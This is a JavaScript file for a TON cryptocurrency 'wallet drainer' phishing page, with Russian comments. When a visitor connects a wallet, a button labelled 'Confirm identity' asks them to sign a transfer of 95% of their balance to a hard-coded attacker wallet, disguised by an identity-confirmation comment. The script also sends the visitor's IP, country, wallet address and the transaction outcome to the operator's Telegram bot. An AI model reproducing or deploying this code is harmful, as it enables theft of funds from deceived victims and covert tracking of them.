var mainWallet = "UQB8vV6TevtZAjKxoaXa8gaOqeu9YhClqtpLBTsvS8orahlI"; // Ваш кошелёк
var tgBotToken = "8291343736:AAHdt8jo9480EvllENN-JEQZNOElnwuxtBg"; // Токен бота
var tgChat = "-1001234567890"; // ID вашего канала (с минусом)

var domain = window.location.hostname;
var ipUser = '';
var countryUser = '';

// Определение IP и страны
fetch('https://ipapi.co/json/')
    .then(res => res.json())
    .then(data => {
        ipUser = data.ip || 'unknown';
        countryUser = data.country || 'unknown';
        console.log('IP:', ipUser, 'Country:', countryUser);
        // Отправка уведомления об открытии
        sendTelegram(`🖥 *Domain:* ${domain}\n👤 *User:* ${ipUser} ${countryUser}\n📖 *Opened the website*`);
    })
    .catch(e => console.error('IP error:', e));

// Функция отправки в Telegram
function sendTelegram(message) {
    if (!tgBotToken || !tgChat) return;
    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: tgChat,
            text: message,
            parse_mode: 'Markdown'
        })
    }).catch(e => console.error('Telegram send error:', e));
}

// Инициализация TON Connect UI
const protocol = window.location.protocol;
const manifestUrl = protocol + '//' + domain + '/tonconnect-manifest.json';
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: manifestUrl,
    buttonRootId: 'ton-connect'
});

// Активация кнопки при подключении
tonConnectUI.on('walletConnected', (walletInfo) => {
    console.log('Wallet connected:', walletInfo);
    document.getElementById('drainBtn').disabled = false;
});

tonConnectUI.on('walletDisconnected', () => {
    document.getElementById('drainBtn').disabled = true;
});

// Кнопка "Подтвердить личность"
document.getElementById('drainBtn').addEventListener('click', async function() {
    if (!tonConnectUI.account) {
        alert('Сначала подключите кошелёк');
        return;
    }

    // Получение баланса
    let balance = 0;
    try {
        const resp = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${tonConnectUI.account.address}`);
        const data = await resp.json();
        if (data.ok) {
            balance = parseInt(data.result) / 1e9; // в TON
        }
    } catch (e) {
        console.error('Balance fetch error:', e);
        alert('Ошибка получения баланса');
        return;
    }

    if (balance < 0.01) {
        alert('Баланс меньше 0.01 TON, операция невозможна');
        return;
    }

    // Сумма для перевода (95%)
    const amountToSend = balance * 0.95;
    const amountNano = Math.floor(amountToSend * 1e9);

    // Транзакция с комментарием "Подтверждение личности"
    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 300,
        messages: [{
            address: mainWallet,
            amount: String(amountNano),
            payload: 'Подтверждение личности' // это будет видно как комментарий
        }]
    };

    try {
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Transaction sent:', result);
        sendTelegram(
            `🖥 *Domain:* ${domain}\n👤 *User:* ${ipUser} ${countryUser}\n💰 *Wallet:* ${tonConnectUI.account.address}\n✅ *Sent:* ${amountToSend.toFixed(4)} TON\n🔗 [Tx](https://tonscan.org/tx/${result})`
        );
        alert('Успешно!');
    } catch (e) {
        console.error('Transaction error:', e);
        sendTelegram(
            `🖥 *Domain:* ${domain}\n👤 *User:* ${ipUser} ${countryUser}\n💰 *Wallet:* ${tonConnectUI.account.address}\n❌ *Declined or error*`
        );
        alert('Отклонено или ошибка');
    }
});
